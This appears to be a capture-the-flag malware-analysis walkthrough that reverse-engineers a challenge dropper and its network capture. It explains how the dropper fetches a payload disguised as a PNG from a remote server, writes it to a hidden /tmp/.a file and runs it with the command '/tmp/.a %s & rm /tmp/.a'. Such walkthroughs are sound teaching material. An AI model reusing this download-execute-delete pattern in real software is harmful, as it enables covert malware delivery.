@@ -1,0 +1,241 @@
+If you are reading this is because you have miserably failed to solve the Case GBC-17/124 10. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usually find in this site 2 or in many CTFs out there. Malware developers does not write their malwares for you to have fun, their actual objective is to really make your live miserable, and the good ones really excel at that.
+
+I’m not a malware analyst and, of course, I’m not a malware developer, however, software wise, these little guys are one of the most interesting programs that you can find out there (together with operating systems and AAA games). So overall, malware analysis is a very interesting topic and that is why you are reading this :). I guess.
+
+If you are planning to solve the challenge, STOP READING NOW!
+
+Some random thoughts
+One thing I have always found funny about malware is its duality. Technically and educationally (which are the only valid points of view for us), a malware and a SW protection system are the same thing or at least pretty similar.
+
+In both cases, there is a program that does something, and somebody puts some stuff around that program to make it difficult to (everybody not allowed) get full access to it. In one case, the objective is to make difficult the analysis of the program so malware analysts have a tough time figuring out what the program does and how to neutralise those protections.
+
+In the other case, the objective is to make difficult the analysis of the program so crackers have a tough time figuring out what the program does and how to neutralise those protections.
+
+The funny thing about this is that malware development is illegal, but SW protection is perfectly legal. Sure, I’m twisting reality a bit here. The main difference is what the program being protected actually does. There is nothing wrong with a program that calculates the payslips for a company, but it is very bad if, instead of that, the program crypts all the files in the computer and asks for a ransom. You will find similar packing, obfuscation and anti-debugging techniques in both tho.
+
+Any lawyer in the room?. This is a good time to stand up and clarify legal situation about this topic!
+
+So, the GCB-17/124 case does not really contain any real program, it is just the shell that can be used to protect something… This case is about the protection of such an hypothetical program (the payload herein), but the payloads themselves used in this challenge are just messages in the console.
+
+After this long introduction let’s start with the stuff we are interested on.
+
+Note: As I said I’m not a malware analyst, this is something I just do for fun. In case some actual malware analyst is in the room, please, do not hesitate to jump in and give some practical advice for the sake of our own education
+
+Taking a look to the Dropper
+The challenge provides you with a dropper and a network dump. Let’s start taking a look to the dropper:
+
+$  file dropper
+dropper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2db02d0690c5d990b1f5d42bd0852f59143b6367, not stripped
+Fine, a 64bits dynamic ELF not stripped. We are actually very lucky… you will not see many like this in the wild :). Let’s also take a look to the strings in the binary:
+
+$ strings dropper
+(...)
+
+HTTP/1.0 200 OK
+Server: ShadowHTTP/3.26 [SECURED]
+Content-type: text/html; charset=UTF-8
+Content-Length: -1
+GET / HTTP/1.1
+User-Agent:BlackNibbles 5.32 xOS 2.1
+Invalid number of parameters
+socket:
+connect:
+Read %d bytes from net
+/tmp/.a
+open:
+/tmp/.a %s & rm /tmp/.a
+(...)
+I have only shown the relevant part here. In general, I like to take a look to the whole dump, but, for relatively normal programs (no heavy obfuscation stuff), the relevant strings are mostly stored in the rodata section. This means that we could get directly the strings we are interested on with something like this:
+
+$  readelf -S dropper | grep -A 1 rodata
+  [15] .rodata           PROGBITS         0000000000400fd0  00000fd0
+       0000000000000123  0000000000000000   A       0     0     8
+From this line we know that the rodata section is located at offset 0x0fd0 in the file and it has a size of 0x123 bytes. Now we can just run strings on that part of the file:
+
+$ dd if=dropper skip=$((0xfd0)) bs=1 count=$((0x123)) 2> /dev/null | strings
+ For the LuLZ
+You can also take a look to the output of readelf and other tools, but overall there is nothing else special on this binary.
+
+So far, what can we infer from the strings we have found?
+
+We see an HTTP request and also a response with doggy Server and User-Agent values. This suggest the dropper will use HTTP to transfer the actual malware or at least will pretend it uses HTTP.
+The line /tmp/.a %s & rm /tmp/.a, suggest that the malware will be dropped at /tmp/.a executed in the background and deleted just after that. We can also see that the malware receives at least one parameter.
+So far so good. Let’s look at the dump.
+
+The network dump
+To look at the network dump the easiest is to use wireshark. Just launch it passing as parameter the capture file
+
+$ wireshark case-GBC-17_124.pcap
+You will see something like this.
+
+
+
+We can see a SYN packet at the top. That indicates a connection attempt. To see the data associated to that TCP dialog, right click on the first packet and chose Follow TCP Stream in the pop-up menu.
+
+You will see the following.
+
+
+
+This looks pretty much like a HTTP request to some server at port 8888. We can see that the client sends 4 bytes of data in the body of its GET request. The reply from the server seems to be a PNG image, but the MIME type does not match.
+
+Let’s see what is in that image. First select only the server response part of the steam and also change the visualisation to Hex Dump:
+
+
+
+Now, take note of the offset to the beginning of the PNG (0x6d in this case) and switch back to Raw data before saving the data to a file named png.dump.
+
+Now we can skip the HTTP header and take a look to our PNG.
+
+$ dd if=png.dump of=image.png skip=$((0x6d)) bs=1
+Well, if you try to open the file or just run file against it, you will immediately note that we are not looking to an image… but something else.
+
+The good news are that, somehow we have probably already extracted the malware sample from the network dump. The bad news are that we have to figure out how to get a usable sample out of that file.
+
+Analysing the Dropper
+The data in our sample is encoded/obfuscated. It does not look like a binary so we need to take a look to the dropper to figure out what it does to the data it receives from that doggy remote server before saving it to the disk.
+
+I will be using STAN for this analysis, but you can use any tool you like. We will be basically looking to the asm so it does not really matter which tool you use to follow the explanation.
+
+Let’s start looking to the main function:
+
+                                  main:                                           │
+00400d0a:   55                      	push	rbp                               │
+00400d0b:   48 89 e5                	mov	rbp, rsp                          │
+00400d0e:   53                      	push	rbx                               │
+00400d0f:   48 81 ec 58 04 00 00    	sub	rsp, 0x458                        │
+00400d16:   89 bd ac fb ff ff       	mov	dword ptr [rbp - 0x454], edi      │; {ls_rbp-1108}
+00400d1c:   48 89 b5 a0 fb ff ff    	mov	qword ptr [rbp - 0x460], rsi      │; {ls_rbp-1120}
+00400d23:   64 48 8b 04 25 28 00 00 	mov	rax, qword ptr fs:[0x28]          │
+00400d2c:   48 89 45 e8             	mov	qword ptr [rbp - 0x18], rax       │; {ls_rbp-24}
+00400d30:   31 c0                   	xor	eax, eax                          │
+00400d32:   83 bd ac fb ff ff 02    	cmp	dword ptr [rbp - 0x454], 2        │; {ls_rbp-1108}
+00400d39:   74 28                   	je	<l12>                             │; 400d63(.text+0x3a3)
+This first code block basically checks that argc (the ARGument Counter parameter to main) is 2 in order to continue. Otherwise, it shows an error and exits as we can see below (the actual exit is under label l13).
+
+00400d3b:   48 8b 05 9e 13 20 00    	mov	rax, qword ptr [rip + 0x20139e]   │;  0x6020e0 <stderr@@GLIBC_2.2.5>
+00400d42:   48 89 c1                	mov	rcx, rax                          │
+00400d45:   ba 1d 00 00 00          	mov	edx, 0x1d                         │
+00400d4a:   be 01 00 00 00          	mov	esi, 1                            │
+00400d4f:   bf 86 10 40 00          	mov	edi, 0x401086                     │; 401086(.rodata+b6)  : 'Invalid number of parameters\n'
+00400d54:   e8 27 fc ff ff          	call	<fwrite@plt>                      │; <fwrite@plt> 400980(.plt+0x120)
+00400d59:   b8 ff ff ff ff          	mov	eax, 0xffffffff                   │
+00400d5e:   e9 cd 01 00 00          	jmp	<l13>                             │; 400f30(.text+0x570)
+Now let’s see what happens when the program is executed with a parameter:
+
+                                   l12:                                           │
+00400d63:   ba 00 00 00 00          	mov	edx, 0                            │
+00400d68:   be 01 00 00 00          	mov	esi, 1                            │
+00400d6d:   bf 02 00 00 00          	mov	edi, 2                            │
+00400d72:   e8 39 fc ff ff          	call	<socket@plt>                      │; <socket@plt> 4009b0(.plt+0x150)
+00400d77:   89 85 c4 fb ff ff       	mov	dword ptr [rbp - 0x43c], eax      │; {ls_rbp-1084}
+00400d7d:   83 bd c4 fb ff ff 00    	cmp	dword ptr [rbp - 0x43c], 0        │; {ls_rbp-1084}
+00400d84:   79 14                   	jns	<l14>                             │; 400d9a(.text+0x3da)
+00400d86:   bf a4 10 40 00          	mov	edi, 0x4010a4                     │; 4010a4(.rodata+d4)  : 'socket:'
+00400d8b:   e8 d0 fb ff ff          	call	<perror@plt>                      │; <perror@plt> 400960(.plt+0x100)
+00400d90:   b8 ff ff ff ff          	mov	eax, 0xffffffff                   │
+00400d95:   e9 96 01 00 00          	jmp	<l13>                             │; 400f30(.text+0x570)
+First it creates a socket (calling the socket function) and the it checks for errors. In case of error, a textual representation of errno is shown with a call to perror and the program exists. Otherwise, the socket gets stored at rbp - 0x43c. (If you are using the .srep file provided in the hints to the challenge you will already see a name for that variable).
+
+                                   l14:                                           │
+00400d9a:   48 8b 85 a0 fb ff ff    	mov	rax, qword ptr [rbp - 0x460]      │; {ls_rbp-1120}
+00400da1:   48 83 c0 08             	add	rax, 8                            │
+00400da5:   48 8b 00                	mov	rax, qword ptr [rax]              │
+00400da8:   48 89 c7                	mov	rdi, rax                          │
+00400dab:   e8 70 fb ff ff          	call	<inet_addr@plt>                   │; <inet_addr@plt> 400920(.plt+0xc0)
+00400db0:   89 85 d4 fb ff ff       	mov	dword ptr [rbp - 0x42c], eax      │; {ls_rbp-1068}
+00400db6:   66 c7 85 d0 fb ff ff 02 	mov	word ptr [rbp - 0x430], 2         │; {ls_rbp-1072}
+00400dbf:   bf b8 22 00 00          	mov	edi, 0x22b8                       │
+00400dc4:   e8 e7 fa ff ff          	call	<htons@plt>                       │; <htons@plt> 4008b0(.plt+0x50)
+00400dc9:   66 89 85 d2 fb ff ff    	mov	word ptr [rbp - 0x42e], ax        │; {ls_rbp-1070}
+00400dd0:   48 8d 8d d0 fb ff ff    	lea	rcx, qword ptr [rbp - 0x430]      │; {ls_rbp-1072}
+00400dd7:   8b 85 c4 fb ff ff       	mov	eax, dword ptr [rbp - 0x43c]      │; {ls_rbp-1084}
+00400ddd:   ba 10 00 00 00          	mov	edx, 0x10                         │
+00400de2:   48 89 ce                	mov	rsi, rcx                          │
+00400de5:   89 c7                   	mov	edi, eax                          │
+00400de7:   e8 84 fb ff ff          	call	<connect@plt>                     │; <connect@plt> 400970(.plt+0x110)
+00400dec:   85 c0                   	test	eax, eax                          │
+00400dee:   79 14                   	jns	<l15>                             │; 400e04(.text+0x444)
+00400df0:   bf ac 10 40 00          	mov	edi, 0x4010ac                     │; 4010ac(.rodata+dc)  : 'connect:'
+00400df5:   e8 66 fb ff ff          	call	<perror@plt>                      │; <perror@plt> 400960(.plt+0x100)
+00400dfa:   b8 01 00 00 00          	mov	eax, 1                            │
+00400dff:   e9 2c 01 00 00          	jmp	<l13>                             │; 400f30(.text+0x570)
+This blocks is actually a connect call. It first sets up IP (inet_addr) and port (htons) to effectively call connect. Then it checks the error code and shows an error and then exit in case the connection failed. You can check the beginning of the main function and verify that rbp - 0x460 contains the first parameter received by the program. So now, we know that the parameter expected by our dropper is the IP address of a server to connect to.
+
+                                   l15:                                           │
+00400e04:   48 8d 95 bc fb ff ff    	lea	rdx, qword ptr [rbp - 0x444]      │; {ls_rbp-1092}
+00400e0b:   8b 85 c4 fb ff ff       	mov	eax, dword ptr [rbp - 0x43c]      │; {ls_rbp-1084}
+00400e11:   48 89 d6                	mov	rsi, rdx                          │
+00400e14:   89 c7                   	mov	edi, eax                          │
+00400e16:   e8 92 fc ff ff          	call	<get_msg>                         │; <get_msg> 400aad(.text+0xed)
+We’ve got to the interesting part… a call to a local function. We will analyse it later, let’s first get the overall view of what the program does.
+
+00400e1b:   48 89 85 c8 fb ff ff    	mov	qword ptr [rbp - 0x438], rax      │; {ls_rbp-1080}
+00400e22:   8b 85 bc fb ff ff       	mov	eax, dword ptr [rbp - 0x444]      │; {ls_rbp-1092}
+00400e28:   89 c6                   	mov	esi, eax                          │
+00400e2a:   bf b5 10 40 00          	mov	edi, 0x4010b5                     │; 4010b5(.rodata+e5)  : 'Read %d bytes from net\n'
+00400e2f:   b8 00 00 00 00          	mov	eax, 0                            │
+00400e34:   e8 87 fa ff ff          	call	<printf@plt>                      │; <printf@plt> 4008c0(.plt+0x60)
+OK, this suggests that the get_msg function is the one that actually transfer the file. Why? . Because the piece of code above is printing to the screen the number of bytes transfer from the net using rax (the value returned by get_msg) as parameter. We indeed have to verify that, but that looks like a reasonable hypothesis
+
+00400e39:   8b 85 c4 fb ff ff       	mov	eax, dword ptr [rbp - 0x43c]      │; {ls_rbp-1084}
+00400e3f:   89 c7                   	mov	edi, eax                          │
+00400e41:   e8 aa fa ff ff          	call	<close@plt>                       │; <close@plt> 4008f0(.plt+0x90)
+00400e46:   ba ff 01 00 00          	mov	edx, 0x1ff                        │
+00400e4b:   be 41 02 00 00          	mov	esi, 0x241                        │
+00400e50:   bf cd 10 40 00          	mov	edi, 0x4010cd                     │; 4010cd(.rodata+fd)  : '/tmp/.a'
+00400e55:   b8 00 00 00 00          	mov	eax, 0                            │
+00400e5a:   e8 f1 fa ff ff          	call	<open@plt>                        │; <open@plt> 400950(.plt+0xf0)
+00400e5f:   89 85 c4 fb ff ff       	mov	dword ptr [rbp - 0x43c], eax      │; {ls_rbp-1084}
+00400e65:   83 bd c4 fb ff ff 00    	cmp	dword ptr [rbp - 0x43c], 0        │; {ls_rbp-1084}
+00400e6c:   79 14                   	jns	<l16>                             │; 400e82(.text+0x4c2)
+00400e6e:   bf d5 10 40 00          	mov	edi, 0x4010d5                     │; 4010d5(.rodata+105)  : 'open:'
+00400e73:   e8 e8 fa ff ff          	call	<perror@plt>                      │; <perror@plt> 400960(.plt+0x100)
+00400e78:   b8 ff ff ff ff          	mov	eax, 0xffffffff                   │
+00400e7d:   e9 ae 00 00 00          	jmp	<l13>                             │; 400f30(.text+0x570)
+Now the socket connection gets closed an the file /tmp/.a is opened. You can now check man 2 open and decode the parameters to the syscall to verify that the file will be created with execution permissions… You’d be able to do that by yourself, but comment below if you experience problems.
+
+                                   l16:                                           │
+00400e82:   8b 85 bc fb ff ff       	mov	eax, dword ptr [rbp - 0x444]      │; {ls_rbp-1092}
+00400e88:   89 85 c0 fb ff ff       	mov	dword ptr [rbp - 0x440], eax      │; {ls_rbp-1088}
+00400e8e:   eb 47                   	jmp	<l17>                             │; 400ed7(.text+0x517)
+                                   l18:                                           │
+00400e90:   8b 9d c0 fb ff ff       	mov	ebx, dword ptr [rbp - 0x440]      │; {ls_rbp-1088}
+00400e96:   8b 85 c0 fb ff ff       	mov	eax, dword ptr [rbp - 0x440]      │; {ls_rbp-1088}
+00400e9c:   48 63 d0                	movsxd	rdx, eax                          │
+00400e9f:   8b 85 bc fb ff ff       	mov	eax, dword ptr [rbp - 0x444]      │; {ls_rbp-1092}
+00400ea5:   48 63 c8                	movsxd	rcx, eax                          │
+00400ea8:   8b 85 c0 fb ff ff       	mov	eax, dword ptr [rbp - 0x440]      │; {ls_rbp-1088}
+00400eae:   48 98                   	cdqe	                                  │
+00400eb0:   48 29 c1                	sub	rcx, rax                          │
+00400eb3:   48 8b 85 c8 fb ff ff    	mov	rax, qword ptr [rbp - 0x438]      │; {ls_rbp-1080}
+00400eba:   48 01 c1                	add	rcx, rax                          │
+00400ebd:   8b 85 c4 fb ff ff       	mov	eax, dword ptr [rbp - 0x43c]      │; {ls_rbp-1084}
+00400ec3:   48 89 ce                	mov	rsi, rcx                          │
+00400ec6:   89 c7                   	mov	edi, eax                          │
+00400ec8:   e8 a3 f9 ff ff          	call	<write@plt>                       │; <write@plt> 400870(.plt+0x10)
+00400ecd:   29 c3                   	sub	ebx, eax                          │
+00400ecf:   89 d8                   	mov	eax, ebx                          │
+00400ed1:   89 85 c0 fb ff ff       	mov	dword ptr [rbp - 0x440], eax      │; {ls_rbp-1088}
+The code above is actually writing the data in the file just created/opened. I will not go through this in detail as it is pretty straightforward and I leave it as an exercise to the reader. However, if you plan to go through the function, better wait until we analyse get_msg so you have more information to figure out what all those local variables are.
+
+                                   l17:                                           │
+00400ed7:   83 bd c0 fb ff ff 00    	cmp	dword ptr [rbp - 0x440], 0        │; {ls_rbp-1088}
+00400ede:   75 b0                   	jne	<l18>                             │; 400e90(.text+0x4d0)
+00400ee0:   8b 85 c4 fb ff ff       	mov	eax, dword ptr [rbp - 0x43c]      │; {ls_rbp-1084}
+00400ee6:   89 c7                   	mov	edi, eax                          │
+00400ee8:   e8 03 fa ff ff          	call	<close@plt>                       │; <close@plt> 4008f0(.plt+0x90)
+00400eed:   48 8b 85 a0 fb ff ff    	mov	rax, qword ptr [rbp - 0x460]      │; {ls_rbp-1120}
+00400ef4:   48 83 c0 08             	add	rax, 8                            │
+00400ef8:   48 8b 10                	mov	rdx, qword ptr [rax]              │
+00400efb:   48 8d 85 e0 fb ff ff    	lea	rax, qword ptr [rbp - 0x420]      │; {ls_rbp-1056}
+00400f02:   48 89 d1                	mov	rcx, rdx                          │
+00400f05:   ba db 10 40 00          	mov	edx, 0x4010db                     │; 4010db(.rodata+10b)  : '/tmp/.a %s & rm /tmp/.a'
+00400f0a:   be 00 04 00 00          	mov	esi, 0x400                        │
+00400f0f:   48 89 c7                	mov	rdi, rax                          │
+00400f12:   b8 00 00 00 00          	mov	eax, 0                            │
+00400f17:   e8 b4 f9 ff ff          	call	<snprintf@plt>                    │; <snprintf@plt> 4008d0(.plt+0x70)
+00400f1c:   48 8d 85 e0 fb ff ff    	lea	rax, qword ptr [rbp - 0x420]      │; {ls_rbp-1056}
+00400f23:   48 89 c7                	mov	rdi, rax                          │
+00400f26:   e8 75 f9 ff ff          	call	<system@plt>                      │; <system@plt> 4008a0(.plt+0x40)
+And finally, the file is closed and the command-line we found with the command strings gets executed by system. Now we can see that the %s in the format string, corresponds to rbp+ 460 or in other words the IP address actually passed as argument to the dropper. So, the malware will also connect to the same server used by the dropper.
+
